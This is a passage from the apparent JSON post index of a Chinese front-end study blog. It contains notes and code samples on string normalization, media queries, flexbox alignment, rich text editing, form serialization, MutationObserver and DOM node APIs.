=== a1.normalize(&quot;NFD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFC&quot;)); // trueconsole.log(a1 === a1.normalize(&quot;NFKD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFKC&quot;)); // true// U+212B 是未规范化的console.log(a2 === a2.normalize(&quot;NFD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFC&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKC&quot;)); // false// U+0041/U+030A 是对 0+212B 进行 NFD/NFKD 规范化之后的结果console.log(a3 === a3.normalize(&quot;NFD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFC&quot;)); // falseconsole.log(a3 === a3.normalize(&quot;NFKD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFKC&quot;)); // false 未规范化： 12345678let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1, a2, a3); // Å, Å, Åconsole.log(a1 === a2); // falseconsole.log(a1 === a3); // falseconsole.log(a2 === a3); // false 选择同一种规范化形式可以让比较操作符返回正确的结果： 1234567let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1.normalize(&quot;NFD&quot;) === a2.normalize(&quot;NFD&quot;)); // trueconsole.log(a2.normalize(&quot;NFKC&quot;) === a3.normalize(&quot;NFKC&quot;)); // trueconsole.log(a1.normalize(&quot;NFC&quot;) === a3.normalize(&quot;NFC&quot;)); // true","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"媒体查询","slug":"媒体查询","date":"2022-01-03T09:42:17.000Z","updated":"2022-08-25T02:11:19.395Z","comments":true,"path":"2022/01/03/媒体查询/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"媒体查询常被用于以下目的： 有条件的通过 @media 和 @import at-rules 用CSS 装饰样式。 用media= 属性为,,和其他HTML元素指定特定的媒体类型。 语法媒体类型和任意数量的媒体特性表达式构成。 当媒体类型（如果指定）与在其上显示文档的设备匹配并且所有媒体功能表达式都计算为true时，媒体查询将计算为true。 涉及未知媒体类型的查询始终为false。 媒体类型描述设备的一般类别。除非使用 not 或 only 逻辑操作符，媒体类型是可选的，并且会（隐式地）应用 all 类型。 1all 适用于所有设备。 1print 适用于在打印预览模式下在屏幕上查看的分页材料和文档。 （有关特定于这些格式的格式问题的信息，请参阅分页媒体。） 1screen 主要用于屏幕。 1speech 主要用于语音合成器。 定位媒体类型12@media screen, print &#123; ... &#125;/*用两个媒体查询来同时定位屏幕和打印设备*/ 媒体特性描述了 user agent、输出设备，或是浏览环境的具体特征。媒体特性表达式是完全可选的，它负责测试这些特性或特征是否存在、值为多少。每条媒体特性表达式都必须用括号括起来。 逻辑操作符 not, and, 和 only 可用于联合构造复杂的媒体查询，您还可以通过用逗号分隔多个媒体查询，将它们组合为一个规则。 and and 操作符用于将多个媒体查询规则组合成单条媒体查询，当每个查询规则都为真时则该条媒体查询为真，它还用于将媒体功能与媒体类型结合在一起。 notnot运算符用于否定媒体查询，如果不满足这个条件则返回true，否则返回false。 如果出现在以逗号分隔的查询列表中，它将仅否定应用了该查询的特定查询。 如果使用not运算符，则还必须指定媒体类型。 注意：在Level 3中，not关键字不能用于否定单个媒体功能表达式，而只能用于否定整个媒体查询。 onlyonly运算符仅在整个查询匹配时才用于应用样式，并且对于防止较早的浏览器应用所选样式很有用。 当不使用only时，旧版本的浏览器会将screen and (max-width: 500px)简单地解释为screen，忽略查询的其余部分，并将其样式应用于所有屏幕。 如果使用only运算符，则还必须指定媒体类型。 , (逗号)逗号用于将多个媒体查询合并为一个规则。 逗号分隔列表中的每个查询都与其他查询分开处理。 因此，如果列表中的任何查询为true，则整个media语句均返回true。 换句话说，列表的行为类似于逻辑或or运算符。 定位媒体特性1234567/*当用户的主要输入机制（例如鼠标）可以悬停在元素上*/@media (hover: hover) &#123; ... &#125;@media (max-width: 12450px) &#123; ... &#125;/*CSS将适用于任何带有彩色屏幕的设备*/@media (color) &#123; ... &#125;/*限制为带有屏幕的设备,宽度至少为30 em的横向的设备*/@media screen and (min-width: 30em) and (orientation: landscape) &#123; ... &#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"toggle","slug":"toggle","date":"2022-01-03T01:47:27.000Z","updated":"2022-01-03T12:40:32.389Z","comments":true,"path":"2022/01/03/toggle/","link":"","permalink":"https://coloey.github.io/2022/01/03/toggle/","excerpt":"","text":"DOMTokenList.toggle()DOMTokenList接口的toggle()方法从列表中删除一个给定的标记并返回false,如果标记不存在，则添加并且函数返回true tokenList.toggle(token,force); 参数：token:标记列表中你想探查并切换的DOMSring force(可选):Boolean值，设置后会将方法变成单向操作，如果设置为false，则会删除标记列表中匹配的给定标记，且不会再添加，如设置为true，则将在标记中添加给定标记，且不会再度删除 返回值：为布尔值 egHTML 1&lt;span class=&quot;a b&quot;&gt;classList is &#x27;a b&#x27;&lt;/span&gt; JavaScript 12345678910var span = document.querySelector(&quot;span&quot;);var classes = span.classList;span.onclick = function() &#123; var result = classes.toggle(&quot;c&quot;); if(result) &#123; span.textContent = &quot;&#x27;c&#x27; added; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125; else &#123; span.textContent = &quot;&#x27;c&#x27; removed; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125;&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"align-self,align-item,align-content","slug":"对齐方式对比","date":"2022-01-03T01:42:03.000Z","updated":"2022-08-25T02:16:29.443Z","comments":true,"path":"2022/01/03/对齐方式对比/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94/","excerpt":"","text":"align-selfCSS属性 align-self 会对齐当前 grid 或 flex 行中的元素，并覆盖已有的 align-items 的值。In Grid, it aligns the item inside the grid area. 在 Flexbox 中，会按照 cross axis（当前 flex 元素排列方向的垂直方向）进行排列。 值auto:设置为父元素的 align-items 值。 normal: 效果取决于当前的布局模式: 绝对定位布局中，normal在绝对定位的替代元素上表现为start，在所有其他绝对定位元素上表现为stretch。 在绝对定位的静态元素上表现为stretch。 flex布局中表现为stretch。 在网格布局中表现为stretch,除了有部分比例或者一个固定大小的盒子的效果像start。 在块级和表格单元中无效。 flex-start:对齐到cross-axis的首端 flex-end:对齐到cross-axis的尾端 center:对齐到cross-axis的中间，如果该元素的 cross-size 尺寸大于 flex 容器，将在两个方向均等溢出。 safe:如果元素大小溢出对齐的容器，则将元素改为对齐，就像start unsafe:无论元素和对齐容器的相对大小如何都遵循给定的对齐值 egHTML 1234567891011&lt;section&gt; &lt;div&gt; Item#1 &lt;/div&gt; &lt;div&gt; Item#2 &lt;/div&gt; &lt;div&gt; Item#3 &lt;/div&gt;&lt;/section&gt; CSS 1234567891011121314151617section &#123; display: flex; align-items: center; height: 120px; background: beige;&#125;div &#123; height: 60px; background: cyan; margin: 5px;&#125;div:nth-child(3) &#123; align-self: flex-end; background: pink;&#125; align-itemsCSS align-items属性将所有直接子节点上的align-self值设置为一个组。 目前，Flexbox和CSS网格布局支持此属性。在Flexbox中，它控制十字轴上项目的对齐方式，在网格布局中，它控制块轴上项目的对齐方式。 align-contentalign-content 属性设置了浏览器如何沿着弹性盒子布局的纵轴和网格布局的主轴在内容项之间和周围分配空间。 123456789101112131415161718192021222324252627282930313233343536/* 基本位置对齐 *//*align-content不采用左右值 */align-content: center; /* 将项目放置在中点 */align-content: start; /* 最先放置项目 */align-content: end; /* 最后放置项目 */align-content: flex-start; /* 从起始点开始放置flex元素 */align-content: flex-end; /* 从终止点开始放置flex元素 *//* 默认对齐 */align-content: normal;/*基线对齐*/align-content: baseline;align-content: first baseline;align-content: last baseline;/* 分布式对齐 */align-content: space-between; /* 均匀分布项目 第一项与起始点齐平， 最后一项与终止点齐平 */align-content: space-around; /* 均匀分布项目 项目在两端有一半大小的空间*/align-content: space-evenly; /* 均匀分布项目 项目周围有相等的空间 */align-content: stretch; /* 均匀分布项目 拉伸‘自动’-大小的项目以充满容器 *//* 溢出对齐 */align-content: safe center;align-content: unsafe center;/* 全局属性 */align-content: inherit; /* 继承 */align-content: initial; /* 初始值 */align-content: unset; /* 未设置 */ justify-itemsjustify-items 属性为所有盒中的项目定义了默认的 justify-self ， 可以使这些项目以默认方式沿适当轴线对齐到每个盒子。 justify-contentjustify-content 属性定义了浏览器之间，如何分配顺着弹性容器主轴(或者网格行轴) 的元素之间及其周围的空间。 1234567891011121314151617181920212223242526272829303132/* Positional alignment */justify-content: center; /* 居中排列 */justify-content: start; /* Pack items from the start */justify-content: end; /* Pack items from the end */justify-content: flex-start; /* 从行首起始位置开始排列 */justify-content: flex-end; /* 从行尾位置开始排列 */justify-content: left; /* Pack items from the left */justify-content: right; /* Pack items from the right *//* Baseline alignment */justify-content: baseline;justify-content: first baseline;justify-content: last baseline;/* Distributed alignment */justify-content: space-between; /* 均匀排列每个元素 首个元素放置于起点，末尾元素放置于终点 */justify-content: space-around; /* 均匀排列每个元素 每个元素周围分配相同的空间 */justify-content: space-evenly; /* 均匀排列每个元素 每个元素之间的间隔相等 */justify-content: stretch; /* 均匀排列每个元素 &#x27;auto&#x27;-sized 的元素会被拉伸以适应容器的大小 *//* Overflow alignment */justify-content: safe center;justify-content: unsafe center;/* Global values */justify-content: inherit;justify-content: initial;justify-content: unset; justify-self[justify-self 在 Flexbox布局中失效]在主轴上，Flexbox将我们的内容作为一个组进行处理。 计算布置子元素所需的空间量，然后剩余空间可用于分配。 justify-content属性控制剩余空间的使用方式。 设置justify-content：flex-end，额外空间放在所有子元素之前，justify-content：space-around，它放在该维度的子元素的两侧，等等。 这意味着在Flexbox中，justify-self属性没有意义，因为我们总是处理移动整个元素组。 在十字轴上，align-self是有意义的，因为我们可能在该维度中的flex容器中有额外的空间，其中单个元素可以移动到开始和结束位置。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"富文本","slug":"富文本","date":"2021-12-13T11:59:24.000Z","updated":"2021-12-30T07:18:06.906Z","comments":true,"path":"2021/12/13/富文本/","link":"","permalink":"https://coloey.github.io/2021/12/13/%E5%AF%8C%E6%96%87%E6%9C%AC/","excerpt":"","text":"富文本编辑在空白 HTML 文件中嵌入一个iframe。通过 designMode 属性，可以将这个空白文档变成可以编辑的，实际编辑的则是元素的 HTML。designMode 属性有两个可能的值：”off”（默认值）和”on”。设置为”on”时 富文本交互使用 document.execCommand()。这个方法在文档上执行既定的命令，可以实现大多数格式化任务。document.execCommand()可以接收 3 个参数：要执行的命令、表示浏览器是否为命令提供用户界面的布尔值和执行命令必需的值 12345678910// 在内嵌窗格中切换粗体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;bold&quot;, false, null);// 在内嵌窗格中切换斜体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;italic&quot;, false, null);// 在内嵌窗格中创建指向 www.wrox.com 的链接frames[&quot;richedit&quot;].document.execCommand(&quot;createlink&quot;, false,&quot;http://www.wrox.com&quot;);// 在内嵌窗格中为内容添加&lt;h1&gt;标签frames[&quot;richedit&quot;].document.execCommand(&quot;formatblock&quot;, false, &quot;&lt;h1&gt;&quot;); 富文本选择在内嵌窗格中使用 getSelection()方法，可以获得富文本编辑器的选区。这个方法暴露在document 和 window 对象上，返回表示当前选中文本的 Selection 对象 12345678910let selection = frames[&quot;richedit&quot;].getSelection();// 取得选中的文本let selectedText = selection.toString();// 取得表示选区的范围let range = selection.getRangeAt(0);// 高亮选中的文本let span = frames[&quot;richedit&quot;].document.createElement(&quot;span&quot;);span.style.backgroundColor = &quot;yellow&quot;;range.surroundContents(span); 通过表单提交富文本12345form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; target.elements[&quot;comments&quot;].value=frames[&quot;richedit&quot;].document.body.innerHTML;//使用内嵌窗格 //target.elements[&quot;comments&quot;].value=document.getElementById(&quot;richedit&quot;).innerHTML;//使用contenteditable&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单序列化","slug":"表单序列化","date":"2021-12-12T11:09:55.000Z","updated":"2021-12-30T07:17:55.272Z","comments":true,"path":"2021/12/12/表单序列化/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E8%A1%A8%E5%8D%95%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"表单在js中可以使用表单字段的type属性连同其name属性和value属性来进行序列化 字段名和值是 URL 编码的并以和号（&amp;）分隔。 禁用字段不会发送。 复选框或单选按钮只在被选中时才发送。 类型为”reset”或”button”的按钮不会发送。 多选字段的每个选中项都有一个值。 通过点击提交按钮提交表单时，会发送该提交按钮；否则，不会发送提交按钮。类型为”image”的元素视同提交按钮。 select元素的值是被选中option元素的 value 属性。如果元素没有 value 属性，则该值是它的文本 返回的结果是查询字符串的格式 1234567891011121314151617181920212223242526272829303132333435363738394041function serialize(form)&#123; let parts=[]; let optValue; for(let field of form.elements)&#123; switch(field.type)&#123; case &quot;select-one&quot;: case &quot;select-multiple&quot;: if(field.name.length)&#123; for(let option of field.options)&#123; if(option.selected)&#123; if(option.hasAttribute)&#123; optValue=(option.hasAttribute(&quot;value&quot;)?option.value:option.text); &#125;else&#123; optValue=(option.attributes[&quot;value&quot;].specified?option.value:option.text); &#125; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(optValue)&#125;`); &#125; &#125; &#125; break; case undefined://字段集 case &quot;file&quot;://文件输入 case &quot;submit&quot;://提交按钮 case &quot;reset&quot;://重置按钮 case &quot;button&quot;://自定义按钮 break; case &quot;radio&quot;://单选按钮 case &quot;checkbox&quot;://复选框 if(!field.checked)&#123;//没被选中，跳出switch，否则进入default分支，将字段的名字和值编码后添加进parts数组 break; &#125; default: //不包含没有名字的表单字段 if(field.name.length)&#123; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(field.value)&#125;`) &#125; &#125; &#125; return parts.join(&quot;&amp;&quot;);&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM编程","slug":"DOM-DOM编程","date":"2021-12-12T09:15:15.000Z","updated":"2022-01-24T08:12:45.132Z","comments":true,"path":"2021/12/12/DOM-DOM编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-DOM%E7%BC%96%E7%A8%8B/","excerpt":"","text":"DOM编程动态脚本1234567891011function loadScriptString(code)&#123; var script=document.createElement(&quot;script&quot;); script.type=&quot;text/javascript&quot;; try&#123; script.appendChild(document.createTextNode(code));//旧版本的IE浏览器可能出问题 &#125;catch(ex)&#123; script.text=code; &#125; document.body.appendChild(script);&#125;loadScriptString(&quot;function sayHi()&#123;alert(&#x27;hi&#x27;);&#125;&quot;); 动态样式123456789101112function loadStyleString(css)&#123; let style=document.createElement(&quot;style&quot;); style.type=&quot;text/css&quot;; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText=css; &#125; let head=document.getElementsByTagName(&quot;head&quot;)[0]; head.appendChild(style);&#125;loadStyleString(&quot;body[background-color:red&#125;&quot;); 对于IE，要小心使用styleSheet.cssText，如果重用同一个style元素并设置该属性超过一次，则可能导致浏览器崩溃，将cssText设置为空字符串也可能导致浏览器崩溃 表单12345678910111213141516171819let table=document.createElement(&quot;table&quot;);table.border=1;table.width=&quot;100%&quot;;let tbody=document.createElement(&quot;tbody&quot;);table.appendChild(tbody);table.insertRow(0);tbody.rows[0].insertCell(0);tbody.rows[0].cells[0].appendChild(document.createTextNode(&quot;Cell 1,1&quot;));tbody.rows[0].insertCell(1);tbody.rows[0].cells[1].appendChild(document.createTextNode(&quot;Cell 2,1&quot;));table.insertRow(1);tbody.rows[1].insertCell(0);tbody.rows[1].cells[0].appendChild(document.createTextNode(&quot;Cell 1,2&quot;));tbody.rows[1].insertCell(1);tbody.rows[1].cells[1].appendChild(document.createTextNode(&quot;Cell 2,2&quot;));document.body.appendChild(table); NodeList12345let divs=document.getElementsByTagName(&quot;div&quot;);for(let i=0,len=divs.length;i&lt;len;i++)&#123; let div=doocument.createElement(&quot;div&quot;); document.body.appendChild(div);&#125;//避免导致无穷循环 Mutationobserver接口在DOM被修改时异步执行回调，使用MutationObserver可以观察整个文档，DOM树的一部分或某个元素 MutationObserver的实例通过调用MutationObserver构造函数并传入一个回调函数创建 1let observer=new MutationObserver(()=&gt;console.log(&#x27;DOM was mutated&#x27;)); observe()方法接收两个参数：要观察其变化的DOM节点，以及一个MutationObserverInit对象（用于控制观察哪些方面的变化，是一个键值对形式配置选项的字典） 12let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;); body元素上任何属性发生变化都会被这个MutationObserver实例发现，然后异步执行注册的回调函数,body元素后代修改或其他非属性修改不会触发回调进入任务 123456let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;console.log(&#x27;Changed body class&#x27;);//Changed body class//&lt;body&gt; attributes changed 回调与MutationRecord每次回调都会收到一个MutationRecord实例的数组,包含的信息发生了什么变化以及DOM哪一部分受到影响 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));[observer.observe(document.body,&#123;attributes:true&#125;);document.body.setAttributeNS(&#x27;foo&#x27;,&#x27;bar&#x27;,&#x27;baz&#x27;);//连续修改多个MutationRecord实例，回调函数就会受到包含这些实例的数组，顺序为变化事件的顺序let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;//[MutationRecord, MutationRecord] disconnect()方法会停止此后变化事件的回调，也会抛弃已经加入任务队列要异步执行的回调 1234567891011let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt;attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;observer.disconnect();document.body.className=&#x27;bar&#x27;;//无日志输出//让已经入队的回调函数执行完毕后再调用disconnect()setTimeout(()=&gt;&#123; observer.disconnect(); document.body.className=&#x27;bar&#x27;;&#125;,0); 复用MutationObserver12345678910let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.target)));let childA=document.createElement(&#x27;div&#x27;); childB=document.createElement(&#x27;span&#x27;);document.body.appendChild(childA);document.body.appendChild(childB);observer.observe(childA,&#123;attributes:true&#125;);observer.observe(childB,&#123;attributes:true&#125;);childA.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);childB.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//[div, span] 重用MutationObserver调用diaconnect()不会结束MutationObserver的生命，还可以重新使用这个观察者，再将它关联到新的目标结点 MutationObserverInit与观察范围观察属性设置attributes为true,观察所有属性 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);//添加属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//修改属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);//移除属性document.body.removeAttribute(&#x27;foo&#x27;); 用attributeFilter添加白名单属性 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributeFilter:[&#x27;foo&#x27;]&#125;);//添加白名单属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//添加被排除的属性document.body.setAttribute(&#x27;baz&#x27;,&#x27;qux&#x27;); 在记录中保存属性原来的值 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));observer.observe(document.body,&#123;attributeOldValue:true&#125;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;qux&#x27;);//[null, &#x27;bar&#x27;, &#x27;baz&#x27;] 观察字符数据12345678910111213let observer=new MutationObserver(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;;//使用characterDataOldValuelet observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterDataOldValue:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;; 观察子节点12345678document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));//创建两个初始子节点document.body.appendChild(document.createElement(&#x27;div&#x27;));document.body.appendChild(document.createElement(&#x27;span&#x27;));observer.observe(document.body,&#123;childList:true&#125;);document.body.insertBefore(document.body.lastChild,document.body.firstChild);//发生两次变化，先移除节点再添加节点 观察子树12345document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));document.body.appendChild(document.createElement(&#x27;div&#x27;));observer.observe(document.body,&#123;attributes:true,subtree:true&#125;);document.body.firstChild.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;); 异步回调与记录队列takeRecords()方法清空记录队列，取出并·返回其中的所有MutationRecord实例,可以用在希望断开与观察目标的联系，但又希望处理由于disconnect()而被抛弃的记录队列中的MutationRecord实例 12345678let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;console.log(observer.takeRecords());console.log(observer.takeRecords());//[MutationRecord, MutationRecord]//[]","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM-节点层级","slug":"DOM-节点层级","date":"2021-12-12T09:13:55.000Z","updated":"2022-01-24T08:14:25.394Z","comments":true,"path":"2021/12/12/DOM-节点层级/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-%E8%8A%82%E7%82%B9%E5%B1%82%E7%BA%A7/","excerpt":"","text":"Node类型DOM Level 描述为名为Node的接口，Node接口在JavaScript中被实现为Node类型，所有结点都继承Node类型，因此所有类型都共享相同的基本属性和方法。 节点类型可通过与这些常量比较来确定 12345678//节点类型可通过与这些常量比较确定，如果两者相等，则意味着someNode是一个元素节点if(someNode.nodeType==Node.ELEMENT_NODE)&#123; alert(&quot;Node is an element&quot;);&#125;//nodeName和nodeValue保存着有关节点的信息if(someNode.nodeType==1)&#123; value=someNode.nodeName;//会显示元素的标签名&#125; 节点关系节点与其他节点的关系可形容为家族关系，每个节点有一个childNodes属性其中包含一个NodeList的实例，NodeList是一个类数组对象，它是DOM结构的查询，DOM结构的变化会自动地在NodeList中反映出来，用于存储可以按位置存取的有序节点。可以使用中括号或者item()方法访问它的值 1234let firstChild=someNode.childNodes[0];let secondChild=someNode.childNodes.item(1);let count=someNode.childNodes.length;let arrayofNodes=Array.from(someNode.childNodes); parentNode指向DOM树中的父元素，childNode中所有节点都有同一个父元素，parentNode指向同一个节点，childNodes列表中每个结点都是同一列表中其他节点的同胞节点，使用previousSibling和nextSibling可以在这个列表的节点间导航。 hasChildNodes()节点返回true则说明节点有一个或多个子节点。 ownerDocument属性是一个指向代表整个文档的文档节点的指针 操纵节点appendChild():用于在childNodes列表末尾添加节点，返回新添加的节点。 123let returnedNode=someNode.appendChild(newNode);alert(returnedNode==newNode);//truealert(someNode.lastChild==newNode);//true inserBefore():接收两个参数，要插入的节点和参照节点。要插入的节点会变成参照节点的前一个同胞节点，并被返回 12345678910returnedNode=someNode.insertBefore(newNode,null);alert(newNode==someNode.lastChild);//true//作为新的第一个子节点插入retunedNode=someNode.insertBefore(newNode,someNode.firstChild);alert(returnedNode==newNode);//truealert(newNode==someNode.fiestChild);//true//插入最后一个子节点的前面returnedNode==someNode.insertBefore(newNode,someNode.lastChild);alert(newNode==someNode.childNodes[someNode.childNodes.length-2]);//true replaceChild():接收两个参数，要插入的节点和要替换的节点。要替换的节点被返回并从文档中被移除 1returnedNode=someNode.replaceChild(newNode,someNode.lastChild);//替换最后一个子节点 removeChild():接收一个参数，即要被移除的节点，被移除的节点会被返回 1let formerFirstChild=someNode.removeChild(someNode.firstChild); cloneNode():传入true参数会进行深复制，即复制节点和整个子DOM树；传入false进行浅复制，只会复制该方法的节点。复制返回的节点属于文档所有，但未指定父节点，称为孤儿节点，通过appendChild()和insertBefore()，replaceChild()方法把孤儿节点添加到文档中 normalize():处理文本节点，如果发现空文本节点则将其删除否则如果两个同胞节点相邻则将其合并为一个文本节点 Document类型表示文档节点的类型,document是HTMLDocument的实例（HTMLDocument继承Document）,表示整个HTML页面，document是window对象的属性是一个全局对象。 nodetype等于9 nodeName值为“#document” nodevalue值为null parentNode值为null ownerDocument值为null 子节点可以使DocumentType(最多一个)，Element(最多一个)，ProcessingInstruction或Comment类型 文档子节点documentElement:始终指向HTML页面中的元素 1234567&lt;html&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;let html=document.documentElement;//取得对&lt;html&gt;的引用alert(html===document.childNodes[0]);alert(html===document.firstChild); document.body:直接指向body元素，取得对body的引用 文档信息title:显示浏览器窗口或标签页的标题栏 URL:包含当前页面的完整URL domain:包含页面的域名 referrer:包含空字符串 123//document.URL=&quot;http://www.wrox.com/WileyCDA/&quot;,document.domain就是www.wrox.comdocument=&quot;wrrox.com&quot;;//成功document=&quot;nczonline.net&quot;;//出错,不能给这个属性设置URL中不包含的值 当页面中包含来自某个不同子域的窗格（)或内嵌窗格()设置document.domain是有用的，比如一个加载自www.wrox.com的页面包含一个内嵌窗格其中的页面加载自p2p.wrox.com，这两个页面包含不同的字符串，内部和外部不能相互访问对方的JavaScript对象，如果每个页面都把document.domain设置为wrox.com,那两个页面就可以相互通信 12document.domain=&quot;wrox.com&quot;;//放松，成功document.doman=&quot;p2p2.wrox.com&quot;;//收紧，失败,一旦放松就不能收紧 定位元素getElementById()：接收一个要获取元素的ID，如果找到这个元素则返回，没找到返回null。参数I必须跟元素在页面中大的id属性完全匹配，包括大小写 12&lt;div id=&quot;myDiv&quot;&gt;ome text&lt;/div&gt;let div=document.getElementById(&quot;myDiv&quot;);//取得对&lt;div&gt;的引用,如果存在多个相同ID的元素则返回在文档中的第一个元素 getElementsByTagName():接收一个参数，即要获取元素的标签名,返回包含0个或多个元素的NodeList，在HTML文档中返回一个HTMLCollection对象 12345678910let images=document.getElementsByTagName(&quot;img&quot;);alert(images.length);//图片数量alert(images[0].src);//第一张图片的src属性alert(images.item(0).src);//通过name属性获得引用&lt;img src=&quot;myImage.gif&quot; name=&quot;myImage&quot;&gt;;let myImage=images.namedItem(&quot;myImage&quot;);//images[&quot;myImage&quot;]//取得文档的所有元素let allElements=document.getElementsByTagName(&quot;*&quot;); getElementsByName():返回具有给定name属性的所有元素，常用于单选按钮 12345678910&lt;fieldset&gt; &lt;legend&gt;Which color do you prefer?&lt;/legend&gt; &lt;ul&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;red&quot; name=&quot;color&quot; id=&quot;colorRed&quot;&gt;&lt;label for=&quot;colorRed&quot;&gt;Red&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;blue&quot; name=&quot;color&quot; id=&quot;colorBlue&quot;&gt;&lt;label for=&quot;colorBlue&quot;&gt;Blue&lt;/label&gt; &lt;/li&gt; let radios=document.getElementsByName(&quot;color&quot;); Element类型 nodeType=1 nodeName值为元素的标签名 nodeValue的值为null parentNode值为Document或Element对象 子节点可以是Element,Text,Comment,ProcessingInstruction等类型 通过nodeName或tagName属性获得元素的标签名 1234567891011121314151617181920//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt; &lt;script&gt; let div=document.getElementById(&quot;myDiv&quot;); alert(div.tagName);//&quot;DIV&quot; alert(div.tagName==div.nodeName);//true if(element.tagName.toLowerCase()==&quot;div&quot;)&#123; //,HTML中，元素标签名以答谢表示，XML中标签名与代码中的大小写一致，不确定脚本是HTML还是XML运行，推荐将标签名转换为小写形式，适合所有文档 &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; HTML元素 id:元素在文档中的唯一标识符 